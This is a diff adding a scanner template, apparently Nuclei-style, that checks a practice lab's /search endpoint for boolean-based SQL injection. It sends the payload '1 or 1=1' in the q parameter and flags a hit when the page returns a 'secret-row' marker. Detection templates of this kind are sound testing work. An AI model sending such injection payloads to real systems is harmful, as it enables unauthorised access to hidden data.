@@ -1,0 +1,21 @@
+id: sentinel-lab-sqli-boolean
+
+info:
+  name: Sentinel Lab SQL 注入 (布尔型)
+  author: sentinel
+  severity: high
+  description: 靶场 /search 的 q 参数存在布尔盲注, 可拖取隐藏数据
+  tags: sqli,lab
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q=1%20or%201%3D1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "secret-row"
